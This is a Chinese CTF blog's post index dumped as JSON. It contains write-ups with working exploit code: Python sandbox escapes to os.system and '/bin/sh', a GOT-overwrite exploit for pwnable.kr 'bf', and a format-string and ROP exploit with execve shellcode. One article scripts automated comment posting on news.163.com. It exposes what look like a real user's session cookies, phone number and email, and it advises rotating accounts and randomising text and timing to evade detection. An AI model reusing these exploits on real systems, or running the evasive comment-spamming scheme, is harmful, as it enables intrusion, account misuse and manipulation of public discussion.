PS：pwn3，500题，这么简单？","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"Writeup","slug":"Writeup","permalink":"https://winter3un.github.io/tags/Writeup/"}]},{"title":"python沙盒绕过","date":"2016-06-08T22:40:11.000Z","path":"2016/06/08/python命令行执行系统命令/","text":"背景来源于ISCC2016的一题pwn题目，nc连上去后发现是一个python shell，当时思路错了，死脑筋的认为这一定是一个python反序列化漏洞，然后各种搜集资料，ORZ。好吧，这其实是一个导入shell模块，命令执行拿flag的姿势。 2017.7.8更新：改名为python沙盒绕过，增加沙盒绕过的各种姿势。 导入模块python中导入模块有以下几种方式 import xxx from xxx import * __import__(&#39;xxx&#39;)程序把前两种都禁用了，而第三种却没有禁用。 shell模块python中shell模块有以下几种 os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() 附上pwn脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python2# -*- coding:utf-8 -*-def banner(): print \"=============================================\" print \" Simple calculator implemented by python \" print \"=============================================\" returndef getexp(): return raw_input(\"&gt;&gt;&gt; \")def _hook_import_(name, *args, **kwargs): module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi', 'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache', 'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip', 'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil', 'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools', 'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new', 'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib', 'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile', 'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer', 'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer', 'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib', 'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2', 'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport'] for forbid in module_blacklist: if name == forbid: # don't let user import these modules raise RuntimeError('No you can\\' import &#123;0&#125;!!!'.format(forbid)) return __import__(name, *args, **kwargs) # normal modules can be importeddef sandbox_filter(command): blacklist = ['exec', 'sh', '__getitem__', '__setitem__', '=', 'open', 'read', 'sys', ';', 'os'] for forbid in blacklist: if forbid in command: return 0 return 1def sandbox_exec(command): # sandbox user input result = 0 __sandboxed_builtins__ = dict(__builtins__.__dict__) __sandboxed_builtins__['__import__'] = _hook_import_ # hook import del __sandboxed_builtins__['open'] _global = &#123; '__builtins__' : __sandboxed_builtins__ &#125; if sandbox_filter(command) == 0: print 'Malicious user input detected!!!' exit(0) command = 'result = ' + command try: exec command in _global # do calculate in a sandboxed environment except Exception, e: print e return 0 result = _global['result'] # extract the result return resultbanner()while 1: command = getexp() print sandbox_exec(command) otherpython内置函数沙盒绕过姿势 [c for c in [].__class__.__base__.__subclasses__() if c.__name__ == &#39;catch_warnings&#39;][0].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;echo Hello SandBox&#39;) getattr绕过 getattr(os,”system”)(“/bin/sh”)","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"python","slug":"python","permalink":"https://winter3un.github.io/tags/python/"}]},{"title":"[wargame-pwnable] bf","date":"2016-06-08T22:40:00.000Z","path":"2016/06/08/wargame-pwnable-bf/","text":"got表的姿势 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *context(log_level=\"debug\")# p = process('./bf')p = remote('pwnable.kr',9001)elf = ELF('bf')#readelf -s bf_libc.so |grep systemlibc_system_addr = 0x0003f250libc_setvbuf_addr = 0x00067f70libc_gets_addr = 0x00066e50p_addr = 0x0804A0A0vul_addr = 0x08048671putchar_got = elf.got['putchar']setvbuf_got = elf.got['setvbuf']memset_got = elf.got['memset']fgets_got = elf.got['fgets']payload = ''payload += '&lt;'*(p_addr-setvbuf_got) # point to setvbuf_gotpayload += '.'+'&gt;'+'.'+'&gt;'+'.'+'&gt;'+'.'+'&gt;'+ '&lt;'*4 #leak setvbuf()payload += '&gt;'*(putchar_got-setvbuf_got)#point to putchar_gotpayload += ','+'&gt;'+','+'&gt;'+','+'&gt;'+','+'&gt;'+'&lt;'*4 #change putchar() to vul_addrpayload += '&lt;'*(putchar_got-memset_got)#point to memset_gotpayload += ','+'&gt;'+','+'&gt;'+','+'&gt;'+','+'&gt;'+'&lt;'*4 #change memset() to gets()payload += '&lt;'*(memset_got-fgets_got)#point to fgets_gotpayload += ','+'&gt;'+','+'&gt;'+','+'&gt;'+','+'&gt;'+'&lt;'*4 #change fgets() to gets()payload +='.'print 'length = '+hex(len(payload))# gdb.attach(p,'b*0x804865A\\nb*0x8048648\\nc')p.recvuntil('pt [ ]\\n')p.sendline(payload)leak = p.recv(1)+p.recv(1)+p.recv(1)+p.recv(1)leak_setvbuf = u32(leak)print 'putchar_got_addr = '+hex(putchar_got)print 'leak_setvbuf = '+hex(leak_setvbuf)system_addr = leak_setvbuf - (libc_setvbuf_addr-libc_system_addr)gets_addr = leak_setvbuf - (libc_setvbuf_addr-libc_gets_addr)print 'system_addr = ' + hex(system_addr) print 'gets_addr = '+hex(gets_addr)print '###change putchar to vul_addr'p.send(p32(vul_addr))print '###change memset to gets'p.send(p32(gets_addr))print '###change fgets to system'p.send(p32(system_addr))print \"###send '/bin/sh'\"p.sendline('/bin/sh\\0')p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"wargame","slug":"wargame","permalink":"https://winter3un.github.io/tags/wargame/"}]},{"title":"2015-问鼎杯线下PWN","date":"2016-06-08T22:39:32.000Z","path":"2016/06/08/2015-问鼎杯线下PWN/","text":"这题当时没做出了哎。。好吧，其实考察点是整型溢出。。。挺有价值的一题题目。题目地址：https://github.com/Winter3un/ctf_task通过逆向得知，题目需要密码，而密码是通过一个算法得到的，要输入一个字符串满足这个算法，但是在32位内，我们的任何输入都满足不了条件，突然发现这边可以进行整型溢出（超过32位的数据，寄存器将丢弃）那么我们可以构造类似于0x1ae312d386d209这样的数据，高于32位的数据将会被丢弃。即0x1ae312d386d209 == 0xD386D209exp如下: 1234567891011121314151617181920212223242526end = 'D386D209'# start = 5381import sys sys.setrecursionlimit(1000000)def get(end): if end == 5381: return True if end &lt;5381: return False for x in range(1,0xff+1): if (end - x) % 33 ==0: flag = get((end - x) / 33) if flag: print hex(end),hex(x) return True else: return False for x in range(0,0xffffff): tmp = int(hex(x).replace('0x','')+end,16) if (tmp - 0xa) % 33 ==0: if get((tmp - 0x0a) / 33): print hex(tmp),hex(0x0a) print 'end' exit(0)","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"}]},{"title":"【pwn】诡异的movsx和cdqe","date":"2016-06-08T22:39:17.000Z","path":"2016/06/08/【pwn】诡异的movsx和cdqe/","text":"背景这是在做hack.lu 2014 的pwn的一题时发现的，也算补一波自己的汇编姿势了。 科普一般而言，我们定义一个字符型数据，正常认识中，我们默认它是无符号的。char a; 错误认知：这是无符号的。但是实际上编译器默认将其认为是有符号的。当我们输入&#39;\\x7f&#39;时，32位下转换成整形后其数据为0x0000007f当我们输入&#39;\\x80&#39;时，32位下转换成整形后其数据为0xffffff80 正文在这边movsx为带符号位扩展，cdqe为转换DWORD(eax)成QWORD(RAX)，所以经过这两步操作，我们的1个字节的字符型数据成功转换成了8字节整型数据，而且是带符号的。那么该整形数据的取证范围为-7f~+7f所以我们可以利用该属性进行整型溢出（想想都兴奋），比如这个数据正好我们能控制，正好该数据是数组的索引。。那么我们就能够取到这个数组地址之前0x7f范围内的数据","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"bin","slug":"bin","permalink":"https://winter3un.github.io/tags/bin/"}]},{"title":"Auto post","date":"2016-06-08T22:38:59.000Z","path":"2016/06/08/Auto-post/","text":"背景某个坑爹的小伙伴说只要我做出这玩意就请我吃3斤龙虾，于是我本着社会主义精神，昧着虾心，来写这篇文章。 主要用的知识点： python编程 http协议包分析 requests库文件的使用 预备环境： windows平台 python2.7 requests库 python路径已经添加至环境变量，requests库已经安装 抓包分析首先我们使用chrome 打开地址http://comment.news.163.com/news_guonei8_bbs/BNCFDKN900014PRF.html 这是我要顶的那个贴的地址。 随意登录一个帐号（我们要跟帖，必须要登录帐号） 然后按F12打开开发者工具，并切换到Network选项卡。 接着我们输入我们要跟帖的文字，注意，文字内容必须健康向上符合《互联网管理办法》，然后点击马上发表 我们在第三个请求包中发现了我们传输过去的内容，同时发现我们的跟帖正在被审核（这边我不清楚是否是人工审核，讲道理应该不会是人工审核，人工审核的话，用自动化脚本来跟帖会比较的麻烦） 点击view source 可以更详细的看到协议包的内容。 我们可以看到，这是一个POST请求包，所以我们需要构造一个post的请求包，有一些字段是没有用的，这里只说对我们跟帖起到作用的字段： 1234POST /api/v1/products/a2869674571f77b5a0867c3d71db5856/threads/BNCFDKN900014PRF/comments?ibc=newspc HTTP/1.1Host: comment.news.163.com##这是贴子的地址 cookie这是用来验证用户身份的。Form data这是urlencode过的数据，点击view source便可以看到，是我们发表的内容。 接下来便是构造请求包了 请求包构造我们这里使用的是python的requests的库。一个简单的请求如下12345from requests import *r = get(&quot;http://www.baidu.com&quot;)print r.content## 这样我们就对百度首页进行了一次get请求 我们也可以换成post 12345from requests import *r = post(&quot;http://www.baidu.com&quot;)print r.content## 一次post请求便完成了 至此我们解决了请求方式的问题以及请求地址的问题。我们还需要解决的是cookie的问题和form data的问题。查看官方文档http://www.python-requests.org/en/master/user/quickstart/#cookies 以下是我们请求包里面的cookie值1_ntes_nuid=910ac3d80a183cd3806dd61479b09d76; usertrack=c+5+hlb7Xhm3WHMlAxSMAg==; _ntes_nnid=b99c6cd761700dcd9345852c71c6137e,1459314268699; _ga=GA1.2.1744200486.1459314269; JSESSIONID-WNC-98XSE=91eb6ff75c89cf758a1a778ff385f3f3a74f1121d1c717f361c42438c4b861d1bee3860c17f7152d419286d103fcd9760e369e6177e38ab70a4d3896743946ce45cd2fd4b0cef4e9ab50fa9047eac2b40960b83b08ffd6ea6306208ac98d45208b87244e260fead013d6c9f3dd8078a8c5d046153453d4c0048246af85b65f19ed6d791d%3A1463715848426; _lkiox7665q_=26; NTES_SESS=UwvXj.cllvWvGy06Xm5xYdTV65rofunn.uAvp7LJVuC3krW0kCD17oXOuWkN13rSNfN24o9GOSeZ_RzjzJBK52oIUbeglGU9r6FIYdH33u4KPMqU1PAMgi8FaUMyCHbHJPZHabBJF3yw1OxP5WeKWrGwMgjUrlVzi95aEMdWPPSsHdX.mY1BQdlxAPegQ0tDS; S_INFO=1463712243|0|2&amp;70##|m18258122031_1; P_INFO=m18258122031_1@163.com|1463712243|1|content|00&amp;99|null&amp;null&amp;null#zhj&amp;330400#10#0#0|182031&amp;1||18258122031@163.com; NTES_PASSPORT=1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx; ANTICSRF=b52fe9b761cd7166754a07a2814a3956; NTES_CMT_USER_INFO=99679345%7Cm182****2031_1%7C%7Cfalse%7CbTE4MjU4MTIyMDMxXzFAMTYzLmNvbQ%3D%3D; n_ht_s=1; cm_newmsg=user%3Dm18258122031_1%26new%3D-1%26total%3D-1; NTES_REPLY_NICKNAME=m18258122031_1%40163.com%7Cm18258122031_1%7C%7C%7C%7C1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx%7C1%7C-1; cmt_vin=e754154fe4a567dd44864ffe1658fa37e24258408af0e2e319bbe3bbccdfb0f2 然后我们按照官方文档所说的，构造cookie字段。1cookies = &#123;&apos;_ntes_nuid&apos;:&apos;910ac3d80a183cd3806dd61479b09d76&apos;,&apos;usertrack&apos;:&apos;c+5+hlb7Xhm3WHMlAxSMAg==&apos;,&apos;_ntes_nnid&apos;:&apos;b99c6cd761700dcd9345852c71c6137e,1459314268699&apos;,&apos;_ga&apos;:&apos;GA1.2.1744200486.1459314269&apos;,&apos;JSESSIONID-WNC-98XSE&apos;:&apos;91eb6ff75c89cf758a1a778ff385f3f3a74f1121d1c717f361c42438c4b861d1bee3860c17f7152d419286d103fcd9760e369e6177e38ab70a4d3896743946ce45cd2fd4b0cef4e9ab50fa9047eac2b40960b83b08ffd6ea6306208ac98d45208b87244e260fead013d6c9f3dd8078a8c5d046153453d4c0048246af85b65f19ed6d791d%3A1463715848426&apos;,&apos;_lkiox7665q_&apos;:&apos;26&apos;,&apos;NTES_SESS&apos;:&apos;UwvXj.cllvWvGy06Xm5xYdTV65rofunn.uAvp7LJVuC3krW0kCD17oXOuWkN13rSNfN24o9GOSeZ_RzjzJBK52oIUbeglGU9r6FIYdH33u4KPMqU1PAMgi8FaUMyCHbHJPZHabBJF3yw1OxP5WeKWrGwMgjUrlVzi95aEMdWPPSsHdX.mY1BQdlxAPegQ0tDS&apos;,&apos;S_INFO&apos;:&apos;1463712243|0|2&amp;70##|m18258122031_1&apos;,&apos;P_INFO&apos;:&apos;m18258122031_1@163.com|1463712243|1|content|00&amp;99|null&amp;null&amp;null#zhj&amp;330400#10#0#0|182031&amp;1||18258122031@163.com&apos;,&apos;NTES_PASSPORT&apos;:&apos;1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx&apos;,&apos;ANTICSRF&apos;:&apos;b52fe9b761cd7166754a07a2814a3956&apos;,&apos;NTES_CMT_USER_INFO&apos;:&apos;99679345%7Cm182****2031_1%7C%7Cfalse%7CbTE4MjU4MTIyMDMxXzFAMTYzLmNvbQ%3D%3D&apos;,&apos;n_ht_s&apos;:&apos;1&apos;,&apos;cm_newmsg&apos;:&apos;user%3Dm18258122031_1%26new%3D-1%26total%3D-1&apos;,&apos;NTES_REPLY_NICKNAME&apos;:&apos;m18258122031_1%40163.com%7Cm18258122031_1%7C%7C%7C%7C1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx%7C1%7C-1&apos;,&apos;cmt_vin&apos;:&apos;e754154fe4a567dd44864ffe1658fa37e24258408af0e2e319bbe3bbccdfb0f2&apos;&#125; 然后构造data发送post包123url = &apos;http://comment.news.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/threads/BNCFDKN900014PRF/comments?ibc=newspc&apos;data = dict(content=&apos;支持习总书记，捍卫祖国安全，相信能带领中国的百姓实现愿望。&apos;,parentId=&apos;&apos;,board=&apos;news_guonei8_bbs&apos;)r = post(url, cookies=cookies,data=data) 整理下,脚本如下123456789101112# -*- coding:utf8 -*-from requests import *url = 'http://comment.news.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/threads/BNCFDKN900014PRF/comments?ibc=newspc'data = dict(content='支持习总书记，捍卫祖国安全，相信能带领中国的百姓实现愿望。',parentId='',board='news_guonei8_bbs')cookies =&#123;'_ntes_nuid':'910ac3d80a183cd3806dd61479b09d76','usertrack':'c+5+hlb7Xhm3WHMlAxSMAg==','_ntes_nnid':'b99c6cd761700dcd9345852c71c6137e,1459314268699','_ga':'GA1.2.1744200486.1459314269','JSESSIONID-WNC-98XSE':'91eb6ff75c89cf758a1a778ff385f3f3a74f1121d1c717f361c42438c4b861d1bee3860c17f7152d419286d103fcd9760e369e6177e38ab70a4d3896743946ce45cd2fd4b0cef4e9ab50fa9047eac2b40960b83b08ffd6ea6306208ac98d45208b87244e260fead013d6c9f3dd8078a8c5d046153453d4c0048246af85b65f19ed6d791d%3A1463715848426','_lkiox7665q_':'26','NTES_SESS':'UwvXj.cllvWvGy06Xm5xYdTV65rofunn.uAvp7LJVuC3krW0kCD17oXOuWkN13rSNfN24o9GOSeZ_RzjzJBK52oIUbeglGU9r6FIYdH33u4KPMqU1PAMgi8FaUMyCHbHJPZHabBJF3yw1OxP5WeKWrGwMgjUrlVzi95aEMdWPPSsHdX.mY1BQdlxAPegQ0tDS','S_INFO':'1463712243|0|2&amp;70##|m18258122031_1','P_INFO':'m18258122031_1@163.com|1463712243|1|content|00&amp;99|null&amp;null&amp;null#zhj&amp;330400#10#0#0|182031&amp;1||18258122031@163.com','NTES_PASSPORT':'1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx','ANTICSRF':'b52fe9b761cd7166754a07a2814a3956','NTES_CMT_USER_INFO':'99679345%7Cm182****2031_1%7C%7Cfalse%7CbTE4MjU4MTIyMDMxXzFAMTYzLmNvbQ%3D%3D','n_ht_s':'1','cm_newmsg':'user%3Dm18258122031_1%26new%3D-1%26total%3D-1','NTES_REPLY_NICKNAME':'m18258122031_1%40163.com%7Cm18258122031_1%7C%7C%7C%7C1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx%7C1%7C-1','cmt_vin':'e754154fe4a567dd44864ffe1658fa37e24258408af0e2e319bbe3bbccdfb0f2'&#125;r = post(url, cookies=cookies,data=data)print r.content.decode('utf8') 最后一行为，打印出返回的内容成功截图 结束语：如果想自动顶帖，写个循环就可以啦，不过用同一个用户，容易被封，多搞几个cookie就行了嘛，也不要一直用同一句话，可以做个字典啊，随机选一句话，随机选一个用户，然后发表，最后时间也可以随机选，那样被服务器检测到的概率就大大降低了~~yes~完成。","tags":[{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"},{"name":"code","slug":"code","permalink":"https://winter3un.github.io/tags/code/"},{"name":"python","slug":"python","permalink":"https://winter3un.github.io/tags/python/"}]},{"title":"[pwn] 关于栈的迁移","date":"2016-05-20T15:29:04.000Z","path":"2016/05/20/pwn-关于栈的迁移/","text":"[pwn] 关于栈的迁移在我们仅仅只能够控制ebp的情况下，我们怎么才能够控制eip去拿到我们的shell呢。 以下为科普以32位程序举例，在使用call这个命令，进入一个函数的时候,程序会进行一系列栈操作:push eip+4;push ebp;mov ebp,esp;来保护现场，避免执行完函数后堆栈不平衡以及找不到之前的入口地址。 执行完函数后会进行一系列操作来还原现场leave;ret;这边的leave就相当于进入函数栈操作的逆过程。12leave == mov esp,ebp;pop ebp;ret == pop eip #弹出栈顶数据给eip寄存器 这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据） 进入主题这次我碰到的这题题目是来自于pwnable的login。我们只能够控制ebp的数据，关键的返回地址的数据由于输入长度的限制并不能控制，然而我们还是可以通过控制ebp来绕过限制。 由于ret返回的是栈顶数据，而栈顶地址是由esp寄存器的值决定的，也就是说如果我们控制了esp寄存器的数据，那么我们也就能够控制ret返回的栈顶数据。 现在我们已经知道了 level能够将ebp寄存器的数据mov到esp寄存器中，然而，一开始ebp寄存器中的值并不是由我们来决定的，重点是接下来的那个pop ebp的操作，该操作将栈中保存的ebp数据赋值给了ebp寄存器，而我们正好能够控制该部分数据。所以利用思路便成立了。 我们首先将栈中保存ebp数据的地址空间控制为我们想要栈顶地址，再利用两次leave操作mov esp,ebp;pop ebp;mov esp,ebp;pop ebp;将esp寄存器中的值变成我们想让它成为的值。由于最后还有一个pop ebp操作多余，该操作将导致esp-4，所以在构造ret的数据时应当考虑到将数据放到我们构造的esp地址-4的位置。 注意该利用需要两次leave哦~","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"bin","slug":"bin","permalink":"https://winter3un.github.io/tags/bin/"}]},{"title":"hexo build","date":"2016-05-19T14:51:09.000Z","path":"2016/05/19/hexo-build/","text":"首先你得有个自己的github账户www.github.com 注册完成后，新建一个名为YOURUSERNAME.github.io仓库，并在设置内将该仓库设置为gitpage 在linux本地设置好git 推荐文档 http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ hexo安装推荐官方安装文档。https://hexo.io/zh-cn/docs/ 博客初始化还是推荐官方文档https://hexo.io/zh-cn/docs/setup.html 主题切换https://github.com/Winter3un/hexo-theme-yilia 备份插件https://github.com/coneycode/hexo-git-backup 写文章hexo分为原始文件和发布文件两种。 首先需要用户写好原始文件，然后使用hexo g来生成发布文件。 接着将生成好的发布文件，hexo d 推送到服务器上。 简略命令hexo g -d 资料：https://hexo.io/zh-cn/docs/writing.htmlhttps://hexo.io/zh-cn/docs/generating.html","tags":[{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"},{"name":"code","slug":"code","permalink":"https://winter3un.github.io/tags/code/"}]},{"title":"mprotect 之痛","date":"2016-05-19T00:36:34.000Z","path":"2016/05/18/mprotect/","text":"这道题目源自于 2016安云杯，题目原题可以在文章最后的附件里下载。 当时拿到这道题目以后，想法很简单。使用fmt将puts函数的got改掉换成程序自带的mprotect后门（如图）。先是用mprotect将栈空间段设置为可执行，然后利用gets函数将shellcode放入站上，由于最后没有将eax清空，eax寄存器仍然保存着栈地址，所以我们可以利用 jmp eax 或者 call eax 跳转到栈上执行。（一个简单的pwn案例） HOWEVER，说好的flag呢！？为什么mprotect函数执行后总是返回-1 ！？ 一脸蒙蔽一定是我打开方式不对。。这个要先等等，然后再开。。没准就弹个shell给我了。嗯，我信了。 于是各种调试脚本。。。然并软，其中有一次竟然弹给我shell了。。这特么还有概率弹shell的啊，我特么第一次碰到啊。。 查了很多资料。发现mprotect操作的前两个参数有具体限制的。 来源于：http://blog.csdn.net/u010651541/article/details/49913029 接着，动态调试下。 这边的第一个参数addr明显没有内存页对齐，用si跟进函数内部。 这边等dl_resolve操作完成之后，用print mprotect打印出mprotect函数在libc中的地址，然后下断点。再c 在执行到mprotect函数的位置停下。 继续跟进。发现在进行syscall系统调用mprotect之后，eax返回了两种不同结果，第一种结果是参数为(0xffe05390,0x80,0x7)的情况，第二种结果是参数为(0xffe05000,0x1000,0x7)的情况，可以发现在内存页对齐的情况下，成功带回eax=0。（这边不知道怎么跟进内核查看，求教大神） 接下来，由于mprotect函数之后gets函数没有限制输入字符的长度，我们可以进行面向返回的编程（rop），将栈上的空间设置为可读可写可执行，并将shellcode放在该栈空间上，最后跳转至该栈空间进行shellcode的执行。 exp如下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *p = process('./safedoor')context(log_level='debug')# p = remote('219.146.15.117',8000)elf = ELF('safedoor')puts_got = elf.got['puts']mprotect_plt = elf.symbols['mprotect']gets_plt = elf.symbols['gets']ppp_ret = 0x080486cdp_ret = 0x080483e1p.recvuntil('KEY:')m_p = 0x0804858Dpage_size = 4096# x&amp;~(page_size-1)gdb.attach(p,'b* 0x0804858D\\nc')payload = \"%70$p...\"p.sendline(payload)ebp = p.recvuntil('...')[8:16]ebp_addr= int(ebp,16)shellcode_addr = (ebp_addr-296-0x98)&amp;~(page_size-1)for x in range(2): l = (m_p &gt;&gt; (x*8)) &amp;0xff payload = p32(puts_got+x)+\"%%%dc\"%(l-4)+\"%4$hhn...\" p.sendline(payload) p.recvuntil('...')l = (m_p &gt;&gt; (2*8)) &amp;0xffpayload = p32(puts_got+2)+\"%4$hhn...\"p.sendline(payload)p.recvuntil('...')l = (m_p &gt;&gt; (3*8)) &amp;0xffpayload = p32(puts_got+3)+\"%%%dc\"%(l-4)+\"%4$hhn...\"p.sendline(payload)p.recvuntil('...')p.sendline('STjJaOEwLszsLwRy')p.recvuntil('\\nKEY:')shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"payload1 = 'A'*(140)+p32(mprotect_plt)+p32(ppp_ret)+p32(shellcode_addr)+p32(page_size)+p32(7)+p32(gets_plt)+p32(p_ret)+p32(shellcode_addr)+p32(shellcode_addr)p.sendline(payload1)p.sendline(shellcode)p.interactive() 题目地址:https://github.com/Winter3un/ctf_task","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://winter3un.github.io/tags/ctf/"}]}]